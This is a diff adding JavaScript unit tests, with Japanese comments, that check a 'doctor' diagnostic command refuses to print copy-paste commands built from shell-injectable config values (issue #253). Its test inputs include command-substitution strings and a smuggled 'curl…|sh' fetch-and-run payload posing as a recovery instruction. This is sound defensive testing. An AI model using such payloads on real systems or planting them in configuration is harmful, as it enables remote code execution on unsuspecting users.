@@ -776,6 +776,227 @@ test('runDoctor: tmux.claudeCommand が制御文字入りでもレポート行�
   );
 });
 
+test('runDoctor: tmux.claudeCommand にシェルの特殊文字が含まれるとコピペ用コマンドを出さない（issue #253）', () => {
+  // hint は「そのままターミナルに貼ってください」という文脈で読まれるため、設定ファイル
+  // 由来の値を `<設定値> --version` の形でコマンド行に埋めると、細工された設定を含む
+  // リポジトリを clone した人が案内どおりに貼った時点で意図しないコマンドが動く。
+  // doctor 自身の実行経路（execFileSync）で防げるのは値に含まれるシェルのメタ文字の解釈
+  // だけで、値そのものは実行されるし、tmux ペインの起動は backend-tmux.js が `sh -c` へ
+  // 渡す設計。ここで潰すのは表示（コマンド行の提示）だけで、実行経路の安全性は別問題。
+  //
+  // 検証値は空白を含まない 1 語にする。先頭トークン抽出（split(/\s+/)）で落ちてしまうと、
+  // 「防げている」ように見えて実際は素通しの実装でもテストが通ってしまうため。
+  for (const claudeCommand of ['claude`id`', '$(id)', 'claude;id', 'claude|id', 'claude&&id']) {
+    withDoctorEnv(
+      {
+        terminalsMode: 'tmux',
+        config: { tmux: { claudeCommand } },
+        claudeInstalled: false,
+        allowedOwners: ['vektor-inc'],
+      },
+      (options) => {
+        const claude = byId(runDoctor(options), 'claude');
+        assert.equal(claude.ok, false);
+        // コピペ用のコマンド行（バッククォートで囲った `<設定値> --version`）を出さないこと。
+        assert.ok(
+          !claude.hint.includes(`\`${claudeCommand} --version\``),
+          `コピペ用コマンドを提示しないこと（実際の hint: ${claude.hint}）`,
+        );
+        // 「動くか確認してください」型の、実行を促す案内自体を出さないこと。
+        assert.doesNotMatch(claude.hint, /が動くか確認してください/);
+        // 代わりに、なぜコマンドを出さないのか＋どこを直すのかを伝えること。
+        // 表示値は 64 文字で切り詰められるため「表示されている値」を主語にすると、長い値で
+        // 「特別な文字が見えないのに含まれると言われる」矛盾が起きる。主語は設定値にする。
+        assert.match(claude.hint, /設定されている値が、実行ファイル名やパスとして扱える文字だけで書かれていない/);
+        assert.match(claude.hint, /tmux\.claudeCommand/);
+        // 値そのものの表示は残す（config.json のどの値を直すのか特定できないと直せない）。
+        // 括りは JSON.stringify（手書きの "…" だと値に " を入れて引用符の外へ出られる）。
+        assert.ok(
+          claude.hint.includes(JSON.stringify(claudeCommand)),
+          `どの値が問題かを表示すること（実際の hint: ${claude.hint}）`,
+        );
+        // 実行される値でもあるので、「放置してよい」と読ませない一言まで出すこと
+        // （backend-tmux.js は tmux ペインの起動でこの値を `sh -c` に渡す）。
+        assert.match(claude.hint, /設定した覚えのない値なら/);
+        // 安全側と同じ「何が見つからないか → 打つ手」の型で始めること。
+        assert.match(claude.hint, /^ペイン起動に使うコマンド /);
+        // 実際に人が読む面（doctor のレポート／`up` の未充足警告は同じ hint を出す）でも
+        // コマンド行が現れないこと。コピペされるのはこちらなので、要件単体だけでなく
+        // 出力まで見て固定する。
+        assert.ok(
+          !formatDoctorReport(runDoctor(options)).includes(`\`${claudeCommand} --version\``),
+          'レポートにもコピペ用コマンドを出さないこと',
+        );
+      },
+    );
+  }
+});
+
+test('runDoctor: 表示で切り詰められて安全に見える値もコピペ用コマンドを出さない（issue #253）', () => {
+  // 判定を表示用ラベルだけに掛けると、64 文字を超える値では危険な末尾が切り落とされ、
+  // ラベルだけ見て「安全」と判定してしまう。生の値にも判定を掛けていることを固定する
+  // （`isShellSafeCommandForDisplay(claudeCommand) &&` を消したらここが落ちる）。
+  const safeHead = '/opt/'.padEnd(64, 'a'); // 先頭 64 文字は許可リストを通る
+  const claudeCommand = `${safeHead}\`id\``;
+  assert.equal(safeHead.length, 64, '前提: 先頭 64 文字ちょうどを安全な文字で埋める');
+  assert.ok(claudeCommand.length > 64, '前提: 表示側で切り詰められる長さにする');
+  withDoctorEnv(
+    {
+      terminalsMode: 'tmux',
+      config: { tmux: { claudeCommand } },
+      claudeInstalled: false,
+      allowedOwners: ['vektor-inc'],
+    },
+    (options) => {
+      const claude = byId(runDoctor(options), 'claude');
+      assert.equal(claude.ok, false);
+      // 切り詰め後の（安全に見える）値でもコマンド行を作らないこと。
+      assert.ok(
+        !claude.hint.includes(`\`${safeHead} --version\``),
+        `切り詰めた値でもコピペ用コマンドを出さないこと（実際の hint: ${claude.hint}）`,
+      );
+      assert.doesNotMatch(claude.hint, /が動くか確認してください/);
+      assert.match(claude.hint, /設定されている値が、実行ファイル名やパスとして扱える文字だけで書かれていない/);
+    },
+  );
+});
+
+test('runDoctor: 設定値に " を入れても hint の引用符から抜け出せない（issue #253）', () => {
+  // 手書きの "…" だと引用符を閉じられ、警告文の手前に偽の指示文（「復旧するには次を実行:」等）
+  // を差し込める。危険側の表示は JSON.stringify で括ること。
+  const claudeCommand = 'claude"。復旧するには次を実行:curl$IFSa.io/x|sh#';
+  withDoctorEnv(
+    {
+      terminalsMode: 'tmux',
+      config: { tmux: { claudeCommand } },
+      claudeInstalled: false,
+      allowedOwners: ['vektor-inc'],
+    },
+    (options) => {
+      const claude = byId(runDoctor(options), 'claude');
+      // 生の値がそのままの形では現れない＝引用符の外へ出られない。
+      assert.ok(!claude.hint.includes(claudeCommand), `引用符の外へ出さないこと: ${claude.hint}`);
+      assert.ok(claude.hint.includes('\\"'), `" をエスケープして表示すること: ${claude.hint}`);
+      // 型（冒頭の言い出し）は安全側と共通のまま崩さない。
+      assert.match(claude.hint, /^ペイン起動に使うコマンド /);
+    },
+  );
+});
+
+test('runDoctor: レポート本体（current）でも設定値の括弧から抜け出せない（issue #253）', () => {
+  // current は `未導入（コマンド: <値>）` と全角括弧の中へ値を入れるため、値に `）` を
+  // 混ぜられると括弧を閉じて外へ出られ、レポートの行そのものが偽の指示文になる。
+  // しかも current の行は hint より上に出るので、読み手が最初に目にする。
+  const claudeCommand = 'claude）。復旧するには次を実行:curl$IFSa.io/x|sh';
+  for (const claudeInstalled of [false, true]) {
+    withDoctorEnv(
+      {
+        terminalsMode: 'tmux',
+        config: { tmux: { claudeCommand } },
+        claudeInstalled,
+        allowedOwners: ['vektor-inc'],
+      },
+      (options) => {
+        const claude = byId(runDoctor(options), 'claude');
+        assert.equal(claude.ok, claudeInstalled);
+        // 値は引用符で囲って出す。囲いを閉じるのは doctor 側（末尾が `"）`）で、値の側から
+        // 閉じることはできない（`"` は JSON.stringify がエスケープする）。これで値の
+        // どこまでが設定値なのかが読み手に分かり、「（コマンド: …）」の外に出た体裁の
+        // 偽の指示文を作れなくなる。
+        assert.match(claude.current, /（コマンド: "/);
+        assert.ok(
+          claude.current.endsWith('"）'),
+          `囲いは doctor 側で閉じること（実際: ${claude.current}）`,
+        );
+        assert.ok(
+          claude.current.includes(JSON.stringify(claudeCommand)),
+          `どの値が問題かは引用符込みで示すこと（実際: ${claude.current}）`,
+        );
+      },
+    );
+  }
+});
+
+test('runDoctor: current に " を入れても引用符の外へ出られない（issue #253）', () => {
+  // ✅ 側でも同じであること。ok の行は読み手の警戒が下がる分、偽の指示文を混ぜられた
+  // ときに効いてしまうので、未導入側と同じ扱いに揃える。
+  const claudeCommand = 'claude"）。復旧するには次を実行:curl$IFSa.io/x|sh';
+  for (const claudeInstalled of [false, true]) {
+    withDoctorEnv(
+      {
+        terminalsMode: 'tmux',
+        config: { tmux: { claudeCommand } },
+        claudeInstalled,
+        allowedOwners: ['vektor-inc'],
+      },
+      (options) => {
+        const reqs = runDoctor(options);
+        const claude = byId(reqs, 'claude');
+        // 生の値がそのままの形では現れない＝引用符を閉じて外へ出られない。
+        assert.ok(
+          !claude.current.includes(claudeCommand),
+          `current で引用符の外へ出さないこと（実際: ${claude.current}）`,
+        );
+        assert.ok(claude.current.includes('\\"'), `" をエスケープすること（実際: ${claude.current}）`);
+        // ✅ で終わる（未充足リストも hint も出ない）レポートでも同じであること。
+        assert.ok(
+          !formatDoctorReport(reqs).includes(claudeCommand),
+          'レポート本体にも生の値を出さないこと',
+        );
+      },
+    );
+  }
+});
+
+test('runDoctor: 正常な独自コマンドでは current の表示を従来どおり素のまま出す（issue #253）', () => {
+  // 危険側だけ JSON.stringify に切り替えるので、通常運用の表示は 1 文字も変わらないこと。
+  withDoctorEnv(
+    {
+      terminalsMode: 'tmux',
+      config: { tmux: { claudeCommand: 'my-claude' } },
+      claudeInstalled: true,
+      allowedOwners: ['vektor-inc'],
+    },
+    (options) => {
+      const claude = byId(runDoctor(options), 'claude');
+      assert.equal(claude.current, '2.0.14 (Claude Code)（コマンド: my-claude）');
+    },
+  );
+});
+
+test('runDoctor: 実行ファイル名・絶対パスとして正常な値では従来どおりコピペ用コマンドを出す（issue #253）', () => {
+  // 許可リスト判定が過剰に効いて、正しく設定できている人の案内まで削らないことの担保。
+  // fnm / volta 配下の絶対パスや、バージョン番号入りのディレクトリ名も安全側に残す。
+  //
+  // 検証値は表示用の長さ制限（sanitizeReportValue の 64 文字）に収まるものだけを使う。
+  // それを超える値が表示側で切り詰められるのは #253 とは別の既存挙動なので、ここでは
+  // 「文字種の判定が過剰でないこと」だけを見る。
+  for (const claudeCommand of [
+    'my-claude',
+    '/opt/homebrew/bin/claude',
+    '/Users/someuser/.local/share/fnm/v20.11.0/bin/claude',
+    'claude_2.0',
+  ]) {
+    withDoctorEnv(
+      {
+        terminalsMode: 'tmux',
+        config: { tmux: { claudeCommand } },
+        claudeInstalled: false,
+        allowedOwners: ['vektor-inc'],
+      },
+      (options) => {
+        const claude = byId(runDoctor(options), 'claude');
+        assert.equal(claude.ok, false);
+        assert.ok(
+          claude.hint.includes(`\`${claudeCommand} --version\``),
+          `コピペ用コマンドを従来どおり出すこと（実際の hint: ${claude.hint}）`,
+        );
+        assert.doesNotMatch(claude.hint, /シェルで特別な意味を持つ文字/);
+      },
+    );
+  }
+});
+
 test('runDoctor: terminals.mode を options ではなく config から解決する', () => {
   withDoctorEnv({ config: { terminals: { mode: 'tmux' } }, allowedOwners: ['vektor-inc'] }, (options) => {
     // terminalsMode を明示注入しない（config から読む。env はヘルパ側で外している）。
